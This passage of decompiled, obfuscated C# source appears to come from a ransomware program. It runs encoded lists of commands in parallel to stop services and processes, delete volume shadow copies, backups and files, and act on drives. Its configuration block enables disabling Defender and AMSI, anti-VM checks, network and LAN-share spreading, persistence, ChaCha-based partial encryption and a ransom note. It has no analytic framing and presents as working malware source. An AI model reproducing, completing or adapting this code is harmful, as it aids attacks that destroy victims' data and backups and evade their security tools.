					File.AppendAllText(DebugReport, getString_0(107389715) + CS_0024_003C_003E8__locals0.inputFile + getString_0(107389966) + ex2.Message + getString_0(107396290));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = scList;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				ProcessCommand(getString_0(107389945), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source2 = netShadowList;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				ProcessCommand(getString_0(107393057), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> source3 = taskList;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				ProcessCommand(Base64Decode(getString_0(107389904)), string_0);
			};
		}
		Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		if (TerminateCustomProcesses == getString_0(107396917))
		{
			string[] customProcToTerminate = CustomProcToTerminate;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					ProcessCommand(Base64Decode(getString_0(107389904)), getString_0(107389879) + string_0 + getString_0(107389870));
				};
			}
			Parallel.ForEach(customProcToTerminate, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		if (!getOSInfo().Contains(getString_0(107389581)))
		{
			Empowered(PowerList);
		}
		else
		{
			List<string> source4 = vssList;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					ProcessCommand(Base64Decode(ReverseString(getString_0(107389865))), string_0);
				};
			}
			Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		List<string> source5 = delList;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				ProcessCommand(Base64Decode(getString_0(107389840)), string_0);
			};
		}
		Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> drvList = DrvList;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				ProcessCommand(getString_0(107389855), string_0);
			};
		}
		Parallel.ForEach(drvList, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		ProcessCommand(getString_0(107389945), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		ProcessCommand(getString_0(107393057), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		ProcessCommand(Base64Decode(getString_0(107389904)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		ProcessCommand(Base64Decode(getString_0(107389904)), getString_0(107389879) + string_0 + getString_0(107389870));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		ProcessCommand(Base64Decode(ReverseString(getString_0(107389865))), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		ProcessCommand(Base64Decode(getString_0(107389840)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		ProcessCommand(getString_0(107389855), string_0);
	}

	static Program()
	{
		Strings.CreateGetStringDelegate(typeof(Program));
		imha = getString_0(107393340);
		PasswordBytes = null;
		Size = getString_0(107396374);
		Mb = getString_0(107389814);
		DizonList = new List<string>();
		DoneExtensions = new List<string>();
		Persistence = getString_0(107396374);
		DynamicPass = getString_0(107393364);
		UniqueId = getString_0(107393364);
		DeceiveMe = getString_0(107396374);
		rand = 0;
		ReleaseLockedFiles = getString_0(107396374);
		AntiVM = getString_0(107396374);
		Delay = getString_0(107396374);
		DelayTime = getString_0(107389801);
		DisableDefender = getString_0(107396917);
		DisableAMSI = getString_0(107396374);
		CriticalProcess = getString_0(107396374);
		WallpaperChanger = getString_0(107396374);
		meltList = new List<string>
		{
			Base64Decode(getString_0(107389828)),
			Base64Decode(getString_0(107389267)),
			Base64Decode(getString_0(107389274)),
			Base64Decode(getString_0(107389225)),
			Base64Decode(getString_0(107389200)),
			Base64Decode(getString_0(107389175)),
			Base64Decode(getString_0(107389190)),
			Base64Decode(getString_0(107389133)),
			Base64Decode(getString_0(107389108)),
			Base64Decode(getString_0(107389115)),
			Base64Decode(getString_0(107389066)),
			Base64Decode(getString_0(107389041)),
			Base64Decode(getString_0(107389528))
		};
		EncryptedDirs = new List<string>();
		SpreadOverNetwork = getString_0(107396917);
		Live4Ever = getString_0(107396374);
		KillTM = getString_0(107396374);
		EncryptedFiles = new List<string>();
		FtpLog = getString_0(107396374);
		appGuid = getString_0(107389535);
		MultipleThreads = getString_0(107396374);
		WoL = getString_0(107396374);
		netShadowList = new List<string>
		{
			Base64Decode(getString_0(107389454)),
			Base64Decode(getString_0(107389421)),
			Base64Decode(getString_0(107389388)),
			Base64Decode(getString_0(107389355)),
			Base64Decode(getString_0(107389322)),
			Base64Decode(getString_0(107389293)),
			Base64Decode(getString_0(107388724)),
			Base64Decode(getString_0(107388695)),
			Base64Decode(getString_0(107388650)),
			Base64Decode(getString_0(107388585)),
			Base64Decode(getString_0(107388584)),
			Base64Decode(getString_0(107388551)),
			Base64Decode(getString_0(107389030)),
			Base64Decode(getString_0(107388969)),
			Base64Decode(getString_0(107388940)),
			Base64Decode(getString_0(107388931)),
			Base64Decode(getString_0(107388890)),
			Base64Decode(getString_0(107388833)),
			Base64Decode(getString_0(107388240)),
			Base64Decode(getString_0(107388207)),
			Base64Decode(getString_0(107388178)),
			Base64Decode(getString_0(107388137)),
			Base64Decode(getString_0(107388128)),
			Base64Decode(getString_0(107388095)),
			Base64Decode(getString_0(107388014)),
			Base64Decode(getString_0(107388469)),
			Base64Decode(getString_0(107388428)),
			Base64Decode(getString_0(107388399)),
			Base64Decode(getString_0(107388390)),
			Base64Decode(getString_0(107388301)),
			Base64Decode(getString_0(107387724)),
			Base64Decode(getString_0(107387667)),
			Base64Decode(getString_0(107387602)),
			Base64Decode(getString_0(107387585)),
			Base64Decode(getString_0(107387520)),
			Base64Decode(getString_0(107387975)),
			Base64Decode(getString_0(107387942)),
			Base64Decode(getString_0(107387901)),
			Base64Decode(getString_0(107387828)),
			Base64Decode(getString_0(107387815)),
			Base64Decode(getString_0(107387754)),
			Base64Decode(getString_0(107387177)),
			Base64Decode(getString_0(107387168)),
			Base64Decode(getString_0(107387135)),
			Base64Decode(getString_0(107387062)),
			Base64Decode(getString_0(107387045)),
			Base64Decode(getString_0(107387480)),
			Base64Decode(getString_0(107387407)),
			Base64Decode(getString_0(107387394)),
			Base64Decode(getString_0(107387317)),
			Base64Decode(getString_0(107387304)),
			Base64Decode(getString_0(107387263)),
			Base64Decode(getString_0(107386646)),
			Base64Decode(getString_0(107386649)),
			Base64Decode(getString_0(107386576)),
			Base64Decode(getString_0(107386511)),
			Base64Decode(getString_0(107386498)),
			Base64Decode(getString_0(107386981)),
			Base64Decode(getString_0(107386904)),
			Base64Decode(getString_0(107386839)),
			Base64Decode(getString_0(107386842)),
			Base64Decode(getString_0(107386785)),
			Base64Decode(getString_0(107386208)),
			Base64Decode(getString_0(107386135)),
			Base64Decode(getString_0(107386138)),
			Base64Decode(getString_0(107386065)),
			Base64Decode(getString_0(107386016)),
			Base64Decode(getString_0(107386467)),
			Base64Decode(getString_0(107386394)),
			Base64Decode(getString_0(107386317)),
			Base64Decode(getString_0(107386284)),
			Base64Decode(getString_0(107386275)),
			Base64Decode(getString_0(107385654)),
			Base64Decode(getString_0(107385609)),
			Base64Decode(getString_0(107385520)),
			Base64Decode(getString_0(107385503)),
			Base64Decode(getString_0(107385474)),
			Base64Decode(getString_0(107385945)),
			Base64Decode(getString_0(107385848)),
			Base64Decode(getString_0(107385831)),
			Base64Decode(getString_0(107385742)),
			Base64Decode(getString_0(107385709)),
			Base64Decode(getString_0(107385136)),
			Base64Decode(getString_0(107385079)),
			Base64Decode(getString_0(107387975)),
			Base64Decode(getString_0(107385054)),
			Base64Decode(getString_0(107384981)),
			Base64Decode(getString_0(107385436)),
			Base64Decode(getString_0(107385359)),
			Base64Decode(getString_0(107385298)),
			Base64Decode(getString_0(107385305)),
			Base64Decode(getString_0(107385228)),
			Base64Decode(getString_0(107385211)),
			Base64Decode(getString_0(107388301)),
			Base64Decode(getString_0(107384634)),
			Base64Decode(getString_0(107384561)),
			Base64Decode(getString_0(107384504)),
			Base64Decode(getString_0(107387724)),
			Base64Decode(getString_0(107384431)),
			Base64Decode(getString_0(107384926)),
			Base64Decode(getString_0(107384837)),
			Base64Decode(getString_0(107384772)),
			Base64Decode(getString_0(107384691)),
			Base64Decode(getString_0(107387602)),
			Base64Decode(getString_0(107384134)),
			Base64Decode(getString_0(107387942)),
			Base64Decode(getString_0(107387585)),
			Base64Decode(getString_0(107384101)),
			Base64Decode(getString_0(107384012)),
			Base64Decode(getString_0(107387520)),
			Base64Decode(getString_0(107383979)),
			Base64Decode(getString_0(107383962)),
			Base64Decode(getString_0(107384393)),
			Base64Decode(getString_0(107388390)),
			Base64Decode(getString_0(107384368)),
			Base64Decode(getString_0(107384355)),
			Base64Decode(getString_0(107384326)),
			Base64Decode(getString_0(107384265)),
			Base64Decode(getString_0(107384252)),
			Base64Decode(getString_0(107384219)),
			Base64Decode(getString_0(107384194)),
			Base64Decode(getString_0(107383605)),
			Base64Decode(getString_0(107383612)),
			Base64Decode(getString_0(107383539)),
			Base64Decode(getString_0(107383526)),
			Base64Decode(getString_0(107383445)),
			Base64Decode(getString_0(107383420)),
			Base64Decode(getString_0(107383899)),
			Base64Decode(getString_0(107383822)),
			Base64Decode(getString_0(107383789)),
			Base64Decode(getString_0(107383780)),
			Base64Decode(getString_0(107388399)),
			Base64Decode(getString_0(107383445)),
			Base64Decode(getString_0(107383739)),
			Base64Decode(getString_0(107383710)),
			Base64Decode(getString_0(107383681)),
			Base64Decode(getString_0(107383088)),
			Base64Decode(getString_0(107383079)),
			Base64Decode(getString_0(107382986)),
			Base64Decode(getString_0(107382945)),
			Base64Decode(getString_0(107382916)),
			Base64Decode(getString_0(107383395)),
			Base64Decode(getString_0(107383322)),
			Base64Decode(getString_0(107383293)),
			Base64Decode(getString_0(107383216)),
			Base64Decode(getString_0(107383151)),
			Base64Decode(getString_0(107382606)),
			Base64Decode(getString_0(107382593)),
			Base64Decode(getString_0(107382532)),
			Base64Decode(getString_0(107382499)),
			Base64Decode(getString_0(107382422)),
			Base64Decode(getString_0(107382869)),
			Base64Decode(getString_0(107382836)),
			Base64Decode(getString_0(107382795)),
			Base64Decode(getString_0(107382778)),
			Base64Decode(getString_0(107388014)),
			Base64Decode(getString_0(107382749)),
			Base64Decode(getString_0(107382692)),
			Base64Decode(getString_0(107382651)),
			Base64Decode(getString_0(107382062)),
			Base64Decode(getString_0(107382053)),
			Base64Decode(getString_0(107381976)),
			Base64Decode(getString_0(107381947)),
			Base64Decode(getString_0(107381866)),
			Base64Decode(getString_0(107382361)),
			Base64Decode(getString_0(107382304)),
			Base64Decode(getString_0(107382247)),
			Base64Decode(getString_0(107382202)),
			Base64Decode(getString_0(107382129)),
			Base64Decode(getString_0(107381560)),
			Base64Decode(getString_0(107388469)),
			Base64Decode(getString_0(107381487)),
			Base64Decode(getString_0(107381458)),
			Base64Decode(getString_0(107381425)),
			Base64Decode(getString_0(107381416)),
			Base64Decode(getString_0(107381355)),
			Base64Decode(getString_0(107388095)),
			Base64Decode(getString_0(107381858)),
			Base64Decode(getString_0(107381777)),
			Base64Decode(getString_0(107381748)),
			Base64Decode(getString_0(107386842)),
			Base64Decode(getString_0(107381715)),
			Base64Decode(getString_0(107381748)),
			Base64Decode(getString_0(107381686)),
			Base64Decode(getString_0(107381689)),
			Base64Decode(getString_0(107381660)),
			Base64Decode(getString_0(107381067)),
			Base64Decode(getString_0(107381050)),
			Base64Decode(getString_0(107380977)),
			Base64Decode(getString_0(107380916)),
			Base64Decode(getString_0(107380887)),
			Base64Decode(getString_0(107380846)),
			Base64Decode(getString_0(107381345)),
			Base64Decode(getString_0(107381268)),
			Base64Decode(getString_0(107381235)),
			Base64Decode(getString_0(107381210)),
			Base64Decode(getString_0(107381133)),
			Base64Decode(getString_0(107413332)),
			Base64Decode(getString_0(107413299)),
			Base64Decode(getString_0(107413258)),
			Base64Decode(getString_0(107413229)),
			Base64Decode(getString_0(107413168)),
			Base64Decode(getString_0(107413135)),
			Base64Decode(getString_0(107413590)),
			Base64Decode(getString_0(107413549)),
			Base64Decode(getString_0(107413532)),
			Base64Decode(getString_0(107413499)),
			Base64Decode(getString_0(107413418)),
			Base64Decode(getString_0(107413405)),
			Base64Decode(getString_0(107412812)),
			Base64Decode(getString_0(107412799)),
			Base64Decode(getString_0(107412718)),
			Base64Decode(getString_0(107412685)),
			Base64Decode(getString_0(107412676)),
			Base64Decode(getString_0(107412635)),
			Base64Decode(getString_0(107413070)),
			Base64Decode(getString_0(107383079)),
			Base64Decode(getString_0(107413037)),
			Base64Decode(getString_0(107413028)),
			Base64Decode(getString_0(107412939)),
			Base64Decode(getString_0(107412910)),
			Base64Decode(getString_0(107412877)),
			Base64Decode(getString_0(107412844)),
			Base64Decode(getString_0(107412315)),
			Base64Decode(getString_0(107412286)),
			Base64Decode(getString_0(107412209)),
			Base64Decode(getString_0(107412196)),
			Base64Decode(getString_0(107412155)),
			Base64Decode(getString_0(107412098)),
			Base64Decode(getString_0(107412529)),
			Base64Decode(getString_0(107412500)),
			Base64Decode(getString_0(107412487))
		};
		scList = new List<string>
		{
			Base64Decode(getString_0(107412446)),
			Base64Decode(getString_0(107412365)),
			Base64Decode(getString_0(107412348)),
			Base64Decode(getString_0(107411755)),
			Base64Decode(getString_0(107411738)),
			Base64Decode(getString_0(107411673)),
			Base64Decode(getString_0(107411564)),
			Base64Decode(getString_0(107412015))
		};
		taskList = new List<string>
		{
			Base64Decode(getString_0(107411958)),
			Base64Decode(getString_0(107411925)),
			Base64Decode(getString_0(107411912)),
			Base64Decode(getString_0(107411831)),
			Base64Decode(getString_0(107411286)),
			Base64Decode(getString_0(107411269)),
			Base64Decode(getString_0(107411192)),
			Base64Decode(getString_0(107411159)),
			Base64Decode(getString_0(107411126)),
			Base64Decode(getString_0(107411093)),
			Base64Decode(getString_0(107411060)),
			Base64Decode(getString_0(107411539)),
			Base64Decode(getString_0(107411498)),
			Base64Decode(getString_0(107411489)),
			Base64Decode(getString_0(107411412)),
			Base64Decode(getString_0(107411379)),
			Base64Decode(getString_0(107411338)),
			Base64Decode(getString_0(107411305)),
			Base64Decode(getString_0(107410784)),
			Base64Decode(getString_0(107410711)),
			Base64Decode(getString_0(107410678)),
			Base64Decode(getString_0(107410637)),
			Base64Decode(getString_0(107410604)),
			Base64Decode(getString_0(107411958)),
			Base64Decode(getString_0(107410595)),
			Base64Decode(getString_0(107410554)),
			Base64Decode(getString_0(107410989)),
			Base64Decode(getString_0(107410956)),
			Base64Decode(getString_0(107410947)),
			Base64Decode(getString_0(107410906)),
			Base64Decode(getString_0(107410873)),
			Base64Decode(getString_0(107410800)),
			Base64Decode(getString_0(107410279)),
			Base64Decode(getString_0(107411925)),
			Base64Decode(getString_0(107410238)),
			Base64Decode(getString_0(107411912)),
			Base64Decode(getString_0(107410205)),
			Base64Decode(getString_0(107410172)),
			Base64Decode(getString_0(107410099)),
			Base64Decode(getString_0(107410066)),
			Base64Decode(getString_0(107410025)),
			Base64Decode(getString_0(107410528)),
			Base64Decode(getString_0(107410495)),
			Base64Decode(getString_0(107410462)),
			Base64Decode(getString_0(107410389)),
			Base64Decode(getString_0(107410348)),
			Base64Decode(getString_0(107410339))
		};
		vssList = new List<string>
		{
			Base64Decode(ReverseString(getString_0(107410298))),
			Base64Decode(getString_0(107409705)),
			Base64Decode(getString_0(107409612)),
			Base64Decode(getString_0(107409515)),
			Base64Decode(getString_0(107409934)),
			Base64Decode(getString_0(107409837)),
			Base64Decode(getString_0(107409232)),
			Base64Decode(getString_0(107409135)),
			Base64Decode(getString_0(107409042)),
			Base64Decode(getString_0(107409457)),
			Base64Decode(getString_0(107409364)),
			Base64Decode(getString_0(107409267)),
			Base64Decode(getString_0(107408662)),
			Base64Decode(ReverseString(getString_0(107410298)))
		};
		PowerList = Base64Decode(getString_0(107408565));
		delList = new List<string>
		{
			Base64Decode(getString_0(107408996)),
			Base64Decode(getString_0(107408802)),
			Base64Decode(getString_0(107408096)),
			Base64Decode(getString_0(107408414)),
			Base64Decode(getString_0(107407708)),
			Base64Decode(getString_0(107407514))
		};
		DrvList = new List<string>
		{
			Base64Decode(getString_0(107407800)),
			Base64Decode(getString_0(107407771)),
			Base64Decode(getString_0(107407198))
		};
		DelayedActivation = getString_0(107396374);
		ExpireOption = getString_0(107396374);
		ActiveAfterDateTime = new DateTime(2000, 1, 1);
		ExpireAfterDateTime = new DateTime(2100, 1, 1);
		PartialEncrytion = getString_0(107396917);
		PartialSize = getString_0(107389552);
		StaticLooks = getString_0(107396374);
		SystemFiles = getString_0(107396374);
		RIPmeBiot = getString_0(107396374);
		ADMINISTRATOR = getString_0(107396917);
		FAC = getString_0(107396374);
		Styler = getString_0(107396374);
		extstyl = new List<string>
		{
			getString_0(107395927),
			getString_0(107396185),
			getString_0(107396505),
			getString_0(107396066)
		};
		LimitMe = getString_0(107396374);
		MaxSize = getString_0(107407137);
		TransparentMan = getString_0(107396374);
		AlternateAlgo = getString_0(107396374);
		Jerry = getString_0(107396374);
		toolLocation = string.Empty;
		Drag_Drop = getString_0(107396374);
		NotifyMe = getString_0(107396374);
		NotifyCustom = getString_0(107396374);
		LegalTitle = getString_0(107393364);
		LegalText = getString_0(107393364);
		Upper = getString_0(107396374);
		LANShares = getString_0(107396917);
		ProcessAll = getString_0(107396374);
		ReleaseAllFiles = getString_0(107396374);
		FixMBR = getString_0(107396374);
		LogonPass = getString_0(107407132);
		VeryBasicMode = getString_0(107396374);
		HorseMount = getString_0(107396374);
		MyStartName = getString_0(107407083);
		SkipC = getString_0(107396374);
		CatchDrv = getString_0(107396374);
		RichText = getString_0(107396374);
		CredActivate = getString_0(107396374);
		MySign = getString_0(107407062);
		Sniffing = getString_0(107396917);
		Blocks = getString_0(107396374);
		Elevated = getString_0(107396374);
		TerminateCustomProcesses = getString_0(107396374);
		CustomProcToTerminate = new string[0];
		Mmf = getString_0(107396374);
		chacha = true;
		ntfsmft = getString_0(107396374);
		Unique = false;
		paexuse = false;
		CleanMemory = false;
		multinote = false;
		DebugReport = getString_0(107407049);
		debugmode = false;
		printnote = false;
		localreport = false;
		AccessToken = false;
		chachapetit = true;
		LocalReportFileName = getString_0(107407028) + Environment.UserName + getString_0(107407047) + Environment.MachineName + getString_0(107406994) + UtilMe.UniqID() + getString_0(107406989);
		Ip1 = new List<string>();
		Ip2 = new List<string>();
		Ip3 = new List<string>();
	}
}
